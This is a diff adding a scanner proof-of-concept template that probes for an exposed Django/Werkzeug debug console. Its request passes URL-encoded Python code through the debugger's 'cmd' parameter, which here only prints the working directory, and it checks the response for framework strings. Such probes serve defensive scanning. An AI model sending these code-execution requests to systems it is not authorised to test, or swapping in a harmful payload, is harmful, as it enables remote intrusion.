@@ -1,0 +1,14 @@
+name: poc-django-debug
+transport: http
+rules:
+  r0:
+    request:
+      method: GET
+      path: "/?__debugger__=yes&cmd=import+os%3bprint(os.getcwd())&frm=0"
+    expression: response.status == 200 && (response.body.bcontains("django") || response.body.bcontains("Werkzeug"))
+expression: r0()
+detail:
+  author: sxel
+  description: Django/Werkzeug debug console exposure probe
+  severity: high
+  tags: django,python,debug,rce
